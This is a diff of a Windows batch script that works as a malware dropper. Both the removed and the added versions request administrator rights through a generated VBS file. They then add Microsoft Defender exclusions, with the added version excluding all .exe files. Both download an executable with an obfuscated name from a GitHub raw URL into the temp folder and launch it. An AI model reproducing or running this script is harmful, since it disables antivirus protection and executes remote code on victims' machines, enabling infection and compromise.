@@ -1,27 +1,30 @@
+@echo off
+
+:: BatchGotAdmin
+:-------------------------------------
+REM  --> Check for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params = %*:"=""
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
 :gotAdmin
-    pushd "%TEMP%"
+    pushd "%CD%"
     CD /D "%~dp0"
-
-    REM --> Silent PowerShell commands
-    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Desktop'" >nul 2>&1
-    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Downloads'" >nul 2>&1
-    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/AppData/'" >nul 2>&1
-
-    REM --> Navigate to the %TEMP% directory
-    cd %TEMP%
-
-    REM --> Download files silently using PowerShell
-    powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/Modification11910275.exe' -OutFile Modification11910275.exe" >nul 2>&1
-
-
-    REM --> Check if NETAPI32.exe exists silently
-    if not exist "Modification11910275.exe" (
-        exit /b
-    )
-
-    REM --> Execute Modification11910275.exe silently
-    start /B "Modification11910275.exe" >nul 2>&1
-    timeout /t 5 /nobreak >nul 2>&1
-
-        )
-    )
+:--------------------------------------
+Powershell -Command "Set-MpPreference -ExclusionExtension exe"
+cd %TEMP%
+Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/Modification11910275.exe' -OutFile Modification11910275.exe"
+start Modification11910275.exe
